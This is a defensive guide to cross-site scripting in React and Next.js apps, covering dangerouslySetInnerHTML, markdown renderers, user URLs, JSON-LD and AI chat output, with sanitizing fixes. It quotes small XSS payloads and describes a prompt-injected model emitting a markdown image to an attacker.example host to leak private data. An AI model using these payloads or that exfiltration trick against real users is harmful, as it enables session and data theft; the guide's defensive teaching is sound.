---
title: "XSS in React and Next.js: dangerouslySetInnerHTML"
description: "React escapes JSX text, but dangerouslySetInnerHTML, rehype-raw, and AI chat output can still run attacker scripts. Sanitize with DOMPurify and allow-list URLs."
pubDate: 2026-10-15
category: guide
tags:
  - xss
  - react
  - nextjs
  - markdown
  - ai
  - sanitization
related:
  - prompt-injection-ai-features-vibe-coded-apps
  - csp-content-security-policy-vibe-coded-apps
  - common-vibe-coded-app-vulnerabilities
  - open-redirect-callbackurl-authjs-supabase-clerk
  - security-review-prompt-for-ai-coding-tools
  - ship-checklist-for-a-vibe-coded-app
  - supabase-auth-security-settings
faqs:
  - question: "Is React safe from XSS by default?"
    answer: "Mostly, for text. React DOM escapes values you put in JSX like {comment.body}, so a string containing <script> shows up as text. The gaps are the escape hatches: dangerouslySetInnerHTML, URLs in href and src, inline JSON in script tags, and markdown or HTML renderers configured to allow raw HTML. OWASP lists dangerouslySetInnerHTML without sanitizing and unvalidated URL values as the main React risks."
  - question: "Is react-markdown safe for user content and AI chat output?"
    answer: "With its defaults, yes. The react-markdown README says it is secure by default and does not use dangerouslySetInnerHTML; HTML in the markdown is escaped or ignored. Adding rehype-raw turns raw HTML back on, which the README only suggests for trusted markdown. If you need raw HTML, add rehype-sanitize after rehype-raw and after any other plugin that could add unsafe content."
  - question: "Can I use DOMPurify in a Next.js Server Component?"
    answer: "Yes, but DOMPurify needs a DOM. Its README says to run it with an up-to-date jsdom on the server, warns that happy-dom is not considered safe, and notes jsdom cannot run on Vercel Edge. isomorphic-dompurify wraps that setup so the same import works on the server and in the browser. Sanitize right before rendering and do not modify the HTML afterwards."
  - question: "Does React 19 stop javascript: links?"
    answer: "React 19 replaces javascript: URLs in href and src with code that throws instead of running the payload (React 19.0.0 changelog). OWASP says this does not replace application-specific URL validation. It does not cover window.location, window.open, server redirects, HTML you render with dangerouslySetInnerHTML, or older React versions. Validate user URLs and allow only http and https."
  - question: "Is a Content-Security-Policy enough to stop XSS?"
    answer: "No. OWASP lists sole reliance on CSP as an anti-pattern. A good CSP makes an injected script harder to run and can stop markdown images from loading from attacker hosts, but the fix is still escaping, sanitizing, and validating URLs. Treat CSP as the second layer."
---

"React prevents XSS" is mostly true, and that is the problem. It is true for text you put in JSX. It stops being true the moment your app renders HTML from a rich text editor, turns on raw HTML in a markdown renderer, puts a user's website into an `href`, or streams AI chat output into the page. AI coding tools reach for those escape hatches often, because they make the demo look right.

This guide covers where cross-site scripting (XSS) still happens in React and Next.js apps built with Cursor, Lovable, Bolt, v0, or Replit, and the fix for each: `dangerouslySetInnerHTML`, markdown and LLM output, user-supplied links, JSON-LD script tags, and why a Supabase session in the browser raises the stakes. The baseline is the [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

Checked against the React, Next.js, react-markdown, rehype, DOMPurify, Supabase, and OWASP docs linked below on October 15, 2026.

## What React escapes, and what it does not

React DOM escapes values embedded in JSX before rendering them. The [legacy React docs](https://legacy.reactjs.org/docs/introducing-jsx.html) put it plainly: everything is converted to a string first, which helps prevent XSS. So this is safe even when `comment.body` contains `<img src=x onerror=...>`:

```tsx
// Safe: rendered as text, angle brackets and all
<p>{comment.body}</p>
```

OWASP's cheat sheet lists what frameworks do not protect you from. For React, it names two things: `dangerouslySetInnerHTML` without sanitizing, and unvalidated URL values. Add the ways people feed HTML to React indirectly, and the list of sinks to search for in a vibe-coded app looks like this:

| Sink | Why it is risky |
| --- | --- |
| `dangerouslySetInnerHTML={{ __html: x }}` | Sets `innerHTML` directly. No escaping. |
| `href={x}` / `src={x}` with a user value | `javascript:` and other schemes; React 19 blocks only `javascript:` |
| Markdown renderer with `rehype-raw` or an "allow HTML" option | Raw HTML in the markdown becomes real elements |
| `<script>` with `JSON.stringify(data)` inside | A `</script>` in the data closes the tag early |
| `ref.current.innerHTML = x`, `insertAdjacentHTML`, `document.write` | Same as `dangerouslySetInnerHTML`, outside React |
| `eval(x)`, `new Function(x)` on model or user output | Runs code directly |

If none of these touch user or model data, React is doing its job. If one does, read the matching section below.

## dangerouslySetInnerHTML: only with sanitized HTML

The [React docs for common components](https://react.dev/reference/react-dom/components/common) are blunt. `dangerouslySetInnerHTML` overrides the element's `innerHTML`, and "Unless the markup is coming from a completely trusted source, it is trivial to introduce an XSS vulnerability this way." Their own example of the hole is a stored post body of `<img src="" onerror='alert("you were hacked")'>`, which runs as soon as it renders.

The vibe-coded version usually comes from a rich text editor, a CMS field, or an email body:

```tsx
// Do not ship this: stored HTML straight into the DOM
export function Post({ post }: { post: { html: string } }) {
  return <div dangerouslySetInnerHTML={{ __html: post.html }} />;
}
```

Fix it in this order:

1. **Do you need HTML at all?** If the content is plain text or markdown, render it as text or with a safe markdown renderer (next section). No sanitizer needed.
2. **If you do need HTML, sanitize it with an allow-list sanitizer.** OWASP recommends [DOMPurify](https://github.com/cure53/DOMPurify) for HTML sanitization.
3. **Sanitize right before rendering, and do not touch the result.** React recommends creating the `{ __html }` object as close as possible to where the HTML is produced. DOMPurify's README and OWASP both warn that modifying HTML after sanitizing it, or passing it to another library that rewrites it, can void the sanitization.

```tsx
'use client';
import DOMPurify from 'dompurify';

export function SafeHtml({ html }: { html: string }) {
  // HTML only (no SVG or MathML), per the DOMPurify README
  const clean = DOMPurify.sanitize(html, { USE_PROFILES: { html: true } });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

DOMPurify's README shows what it removes, for example `<img src=x onerror=alert(1)//>` becomes `<img src="x">`. Keep DOMPurify patched; OWASP notes that browser changes and new bypasses show up regularly.

### Sanitizing on the server in Next.js

Server Components and Route Handlers have no browser DOM, and DOMPurify needs one. The DOMPurify README covers this:

- Use [jsdom](https://github.com/jsdom/jsdom), and keep it on the latest version. Older jsdom versions have known bugs that lead to XSS even when DOMPurify works correctly.
- happy-dom is **not considered safe** with DOMPurify.
- jsdom cannot run on Cloudflare Workers or Vercel Edge, so do this in a Node.js function, not an Edge one.

The [isomorphic-dompurify](https://github.com/kkomelin/isomorphic-dompurify) package wraps the jsdom setup so the same import works on the server and in the browser:

```ts
// lib/sanitize-html.ts
import DOMPurify from 'isomorphic-dompurify';

export function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, { USE_PROFILES: { html: true } });
}
```

```tsx
// app/posts/[id]/page.tsx (Server Component, Node.js runtime)
import { sanitizeHtml } from '@/lib/sanitize-html';
import { getPost } from '@/lib/posts'; // your data access

export default async function PostPage({ params }: { params: Promise<{ id: string }> }) {
  const { id } = await params;
  const post = await getPost(id);
  const clean = sanitizeHtml(post.html);
  return <article dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

Check the isomorphic-dompurify README for its supported Node.js versions before you install, and for `clearWindow()` if you sanitize a lot in a long-running process.

## Markdown: react-markdown is safe until you add rehype-raw

The [react-markdown README](https://github.com/remarkjs/react-markdown) says the component is "secure by default" and does not use `dangerouslySetInnerHTML`. HTML inside the markdown is escaped, or ignored entirely if you set `skipHtml`. Links and images go through `defaultUrlTransform`, which allows `http`, `https`, `irc`, `ircs`, `mailto`, and `xmpp`, plus relative URLs, so a `[click](javascript:...)` link does not survive.

Three ways that safety gets switched off:

1. **Adding [rehype-raw](https://github.com/rehypejs/rehype-raw).** The react-markdown README suggests it only when you trust the markdown. It is also the quick fix people reach for when HTML in their content shows up as literal text. The rehype-raw README points out that the `allowDangerousHtml` option in remark-rehype, which raw HTML depends on, is dangerous.
2. **Overriding `urlTransform`** with something that lets every URL through. The react-markdown README says this opens you up to XSS.
3. **Plugins and custom `components`** that build HTML from content. The README says these may be insecure too.

If you need raw HTML in markdown, sanitize the result with [rehype-sanitize](https://github.com/rehypejs/rehype-sanitize). Its default schema follows how GitHub sanitizes, and its README says to run it **after the last unsafe thing**, because anything after it could be unsafe:

```tsx
import Markdown from 'react-markdown';
import rehypeRaw from 'rehype-raw';
import rehypeSanitize from 'rehype-sanitize';

export function UserMarkdown({ source }: { source: string }) {
  return (
    <Markdown rehypePlugins={[rehypeRaw, rehypeSanitize]}>
      {source}
    </Markdown>
  );
}
```

If you also use a syntax highlighter, the rehype-sanitize README shows the order: sanitize (allowing the `language-*` classes you need), then highlight.

Other markdown libraries that output an HTML string (marked, markdown-it, remarkable) end with `dangerouslySetInnerHTML`. React's own docs use one in an example and call it safe **only** because the output is shown to the same user who typed it. If the markdown comes from anyone else, run the HTML through DOMPurify first.

## AI chat output is untrusted input

LLM output is not your code. It is text that a prompt can steer, including text the user never typed: a web page the model read, a support ticket, a PDF, or another user's profile. That is [prompt injection](/guides/prompt-injection-ai-features-vibe-coded-apps/). The [OWASP Top 10 for LLM Applications](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/) lists "Improper Output Handling" separately, and one of its examples is exactly this: the model returns JavaScript or Markdown, and the browser interprets it, resulting in XSS. OWASP's advice is to treat the model like any other user and encode its output for where it is shown.

For a chat UI that means:

- **Never render model output with `dangerouslySetInnerHTML`**, even if "the model only returns markdown." A single injected instruction can make it return HTML.
- **Use react-markdown without rehype-raw** for chat bubbles. You lose arbitrary HTML, which you do not want from a model anyway.
- **Never `eval` or `new Function` model output**, and do not drop model-written HTML into an `iframe` on your own origin.
- **Decide what to do with images and links.** See below.

### Markdown images can leak data with no click

A markdown image is a request the browser makes as soon as the message renders. If a prompt injection gets the model to output `![loading](https://attacker.example/log?d=...)` with private data in the query string, that data goes to the attacker's server the moment the bubble appears. react-markdown's default URL transform allows `https` images, so this is not blocked by default. It is not XSS, but it hurts in the same way.

Restrict images in model output to hosts you control, and show link destinations so users can see where a link goes:

```tsx
'use client';
import Markdown from 'react-markdown';

// Hosts you serve images from. Placeholder values.
const IMAGE_HOSTS = new Set(['yourapp.com', 'YOUR_PROJECT_REF.supabase.co']);

function isAllowedImage(src: unknown): src is string {
  if (typeof src !== 'string') return false;
  try {
    const url = new URL(src);
    return url.protocol === 'https:' && IMAGE_HOSTS.has(url.hostname);
  } catch {
    return false;
  }
}

export function ChatMessage({ text }: { text: string }) {
  return (
    <Markdown
      components={{
        img({ src, alt }) {
          if (isAllowedImage(src)) return <img src={src} alt={alt ?? ''} />;
          return <span>[image not shown: {alt || 'external image'}]</span>;
        },
        a({ href, children }) {
          return (
            <a href={href} target="_blank" rel="noopener noreferrer nofollow">
              {children}
              {href ? <small> ({href})</small> : null}
            </a>
          );
        },
      }}
    >
      {text}
    </Markdown>
  );
}
```

`href` here has already passed react-markdown's default URL transform, so `javascript:` links are stripped before your component sees them. A CSP `img-src` that lists only your own hosts is a second backstop for the same leak ([CSP guide](/guides/csp-content-security-policy-vibe-coded-apps/)).

## User-supplied URLs: allow-list http and https

Profile "website" fields, social links, and "link to your portfolio" inputs end up in `href`. The classic payload is a `javascript:` URL.

React's protection has improved. [React 16.9](https://legacy.reactjs.org/blog/2019/08/08/react-v16.9.0.html) started warning about `javascript:` URLs, and the [React 19.0.0 changelog](https://github.com/react/react/blob/main/CHANGELOG.md) says they "are replaced with functions that throw errors." OWASP's cheat sheet adds the important part: React 19 blocking `javascript:` URLs in `src` and `href` "does not replace application-specific URL validation." React does not see `window.location.href = url`, `window.open(url)`, a server redirect, links inside HTML you render with `dangerouslySetInnerHTML`, or apps still on React 18.

Validate with the [URL](https://developer.mozilla.org/en-US/docs/Web/API/URL) parser, allow only `http:` and `https:`, and do it when saving (server side) and again when rendering:

```ts
// lib/safe-url.ts
export function safeHttpUrl(raw: unknown): string | null {
  if (typeof raw !== 'string') return null;
  let url: URL;
  try {
    url = new URL(raw.trim()); // relative or malformed input throws
  } catch {
    return null;
  }
  if (url.protocol !== 'https:' && url.protocol !== 'http:') return null;
  return url.href;
}
```

```tsx
const website = safeHttpUrl(profile.website);
{website ? (
  <a href={website} target="_blank" rel="noopener noreferrer nofollow">
    {new URL(website).hostname}
  </a>
) : null}
```

Do not use string checks like `startsWith('http')` or "does not contain javascript". Mixed case, whitespace, and encoded characters get around them. The parser handles that. If the URL is a post-login redirect instead of a profile link, use the same-origin rules in the [open redirect guide](/guides/open-redirect-callbackurl-authjs-supabase-clerk/).

## JSON in script tags and JSON-LD

Structured data and "hydrate this data on the client" patterns put `JSON.stringify` output inside a `<script>` tag. `JSON.stringify` does not escape `<`, so a product name or bio containing `</script>` closes the tag early, and whatever follows is parsed as HTML, including a new `<script>`.

The [Next.js JSON-LD guide](https://nextjs.org/docs/app/guides/json-ld) calls this out: `JSON.stringify` "does not sanitize malicious strings used in XSS injection," and its example replaces `<` with its unicode escape:

```tsx
// From the Next.js JSON-LD guide (shape)
<script
  type="application/ld+json"
  dangerouslySetInnerHTML={{
    __html: JSON.stringify(jsonLd).replace(/</g, '\\u003c'),
  }}
/>
```

`\u003c` is still `<` to a JSON parser, so search engines read the same data, but the HTML parser never sees a closing tag. Next.js also mentions community alternatives such as serialize-javascript. Apply the same escape anywhere you hand-roll `<script>window.__DATA__ = ...</script>`, and check structured data that AI tools added to product, profile, or blog pages built from user content.

## Why XSS hurts more with a Supabase session in the browser

XSS runs as your site, so it can read whatever your own JavaScript can read. With Supabase, that includes the session:

- The [Supabase server-side auth guide](https://supabase.com/docs/guides/auth/server-side/advanced-guide) says that without SSR, the access token and refresh token are stored in local storage by default. The [JavaScript client reference](https://supabase.com/docs/reference/javascript/initializing) describes `persistSession` as saving the session into local storage.
- With SSR (`@supabase/ssr`), the tokens move to cookies, but the same guide says making them `HttpOnly` "is not necessary" because the browser side needs the refresh token. Script on the page can still reach them.

So one stored XSS on a page other users visit can copy their access and refresh tokens and act as them from anywhere until the session ends. Your RLS policies still apply, but to the attacker the victim's rows now look like their own. The same is true for any SPA that keeps a JWT in `localStorage`.

`HttpOnly` cookies help but are not a fix. OWASP notes that cookie attributes limit the impact of XSS but do not stop the malicious script from running. A script running in the victim's tab can still call your API with their session. Preventing the XSS is the fix. Settings that stop a stolen session from becoming a stolen account (reauthentication before password changes) are in [Supabase Auth security settings](/guides/supabase-auth-security-settings/).

## CSP is the second layer

A Content-Security-Policy tells the browser which scripts may run and which hosts it may load from. With a nonce- or hash-based `script-src` and no `'unsafe-inline'`, an injected `<script>` or `onerror=` handler is blocked even if your sanitizer misses it. A tight `img-src` stops the markdown image leak above. OWASP's LLM output guidance recommends a strict CSP for exactly this case.

OWASP's XSS cheat sheet also lists "sole reliance on CSP" as an anti-pattern. Ship the fixes above first, then add a policy. The [CSP guide for vibe-coded apps](/guides/csp-content-security-policy-vibe-coded-apps/) has a starter policy, the Next.js setup, and a Report-Only rollout that will not break Stripe or Clerk.

If you want to go further, OWASP and the React docs both mention Trusted Types, which make `innerHTML`-style sinks reject plain strings unless they go through a policy you define (for example one that calls DOMPurify).

## Self-test in your own app

Use a test account on your own deployment. These checks only use your app's normal forms.

1. **Text fields.** Set your display name or a comment to `<b>bold?</b>`. You want to see the tags as literal text. If the word renders bold, that field reaches an HTML sink. Find it.
2. **Markdown and chat.** Post or ask the chatbot to reply with `<b>bold?</b>` and with a markdown image from a domain you do not control. Raw HTML should show as text, and the external image should not load (check the Network tab for a request to that domain).
3. **Profile links.** Save `javascript:void(0)` as your website. The server should reject it at save time, not just render it inert.
4. **JSON-LD.** Put `</script>` in a product name or bio that feeds structured data, then view the page source. You should see `\u003c/script>` inside the JSON, not a closed tag.
5. **Headers.** Check that production sends a `Content-Security-Policy` header.

## Ask your AI coding tool to check

Paste this into Cursor, Claude Code, Bolt, Lovable, or Replit inside your own project:

```text
Audit this app for XSS. List every place that renders HTML or URLs from
users, the database, a CMS, or AI model output:
- dangerouslySetInnerHTML, innerHTML, insertAdjacentHTML, document.write
- markdown renderers (react-markdown with rehype-raw or custom urlTransform,
  marked, markdown-it) and whether output is sanitized
- href/src built from user or model data, window.location, window.open
- <script> tags containing JSON.stringify output (JSON-LD, hydration data)
- eval or new Function on any dynamic string
For each, say where the data comes from and whether it is sanitized.
Fix with: DOMPurify (isomorphic-dompurify on the server, Node.js runtime),
react-markdown without rehype-raw or with rehype-sanitize last, an
http/https allow-list using new URL(), .replace(/</g, '\\u003c') for
JSON in script tags, and image host allow-lists for chat output.
Do not print, move, or log any secrets or env values.
```

Then read every file it names. It may miss sinks in third-party components, so search the repo for `dangerouslySetInnerHTML` and `rehype-raw` yourself. The [security review prompt](/guides/security-review-prompt-for-ai-coding-tools/) covers the rest of the app.

## Checklist

- [ ] Every `dangerouslySetInnerHTML` uses trusted HTML or DOMPurify output, sanitized right before rendering
- [ ] Server-side sanitizing uses DOMPurify with an up-to-date jsdom (or isomorphic-dompurify), not happy-dom, and not on Edge
- [ ] react-markdown has no rehype-raw, or has rehype-sanitize after the last unsafe plugin
- [ ] No custom `urlTransform` that allows every URL
- [ ] AI chat output never goes through `dangerouslySetInnerHTML`, `eval`, or `new Function`
- [ ] Images in model output are limited to your own hosts; link destinations are visible
- [ ] User-supplied URLs are parsed with `new URL()` and limited to `http:` and `https:` on save and on render
- [ ] JSON inside `<script>` tags escapes `<` as `\u003c`
- [ ] You know where your Supabase session lives (local storage or cookies) and treat any XSS as session theft
- [ ] A Content-Security-Policy is live ([CSP guide](/guides/csp-content-security-policy-vibe-coded-apps/))
- [ ] Prompt injection reviewed for AI features ([prompt injection guide](/guides/prompt-injection-ai-features-vibe-coded-apps/))
- [ ] Folded into your [ship checklist](/checklists/ship-checklist-for-a-vibe-coded-app/) and the [common vulnerabilities](/guides/common-vibe-coded-app-vulnerabilities/) review

## Sources

- [OWASP: Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Top 10 for LLM Applications: LLM05 Improper Output Handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/)
- [React: Common components (`dangerouslySetInnerHTML`)](https://react.dev/reference/react-dom/components/common)
- [React (legacy docs): JSX prevents injection attacks](https://legacy.reactjs.org/docs/introducing-jsx.html)
- [React changelog (19.0.0: `javascript:` URLs)](https://github.com/react/react/blob/main/CHANGELOG.md)
- [React 16.9 release post (deprecating `javascript:` URLs)](https://legacy.reactjs.org/blog/2019/08/08/react-v16.9.0.html)
- [react-markdown README (security, `urlTransform`, `skipHtml`)](https://github.com/remarkjs/react-markdown)
- [rehype-raw README](https://github.com/rehypejs/rehype-raw)
- [rehype-sanitize README](https://github.com/rehypejs/rehype-sanitize)
- [DOMPurify README (server-side use, jsdom, foot-guns)](https://github.com/cure53/DOMPurify)
- [isomorphic-dompurify README](https://github.com/kkomelin/isomorphic-dompurify)
- [Next.js: JSON-LD](https://nextjs.org/docs/app/guides/json-ld)
- [MDN: URL](https://developer.mozilla.org/en-US/docs/Web/API/URL)
- [Supabase: Server-side auth advanced guide (token storage)](https://supabase.com/docs/guides/auth/server-side/advanced-guide)
- [Supabase: JavaScript client initializing (`persistSession`)](https://supabase.com/docs/reference/javascript/initializing)
